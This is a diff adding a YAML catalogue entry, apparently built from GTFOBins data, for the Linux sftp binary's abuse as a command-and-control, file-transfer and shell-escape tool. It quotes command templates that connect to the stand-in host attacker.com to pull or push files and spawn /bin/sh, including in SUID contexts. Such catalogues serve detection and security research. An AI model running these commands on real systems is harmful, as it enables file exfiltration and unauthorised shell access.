@@ -1,0 +1,93 @@
+id: gtfobins/sftp/download/unprivileged
+type: binary
+platform: linux
+name: sftp
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'sftp user@attacker.com
+
+    get /path/to/input-file /path/to/output-file'
+references:
+- https://gtfobins.github.io/gtfobins/sftp/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        sftp:
+          functions:
+            download:
+            - code: 'sftp user@attacker.com
+
+                get /path/to/input-file /path/to/output-file'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: ssh-server
+            shell:
+            - code: 'sftp user@attacker.com
+
+                !/bin/sh'
+              comment: This still requires a successfull connection to the server.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            upload:
+            - code: 'sftp user@attacker.com
+
+                put /path/to/input-file /path/to/output-file'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: ssh-server
+    upstream_url: https://gtfobins.github.io/gtfobins/sftp/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:53f82587dbdb6244946d5d49e81a2c7e99fb33d5e109d6827407a8ae14fdb4a2
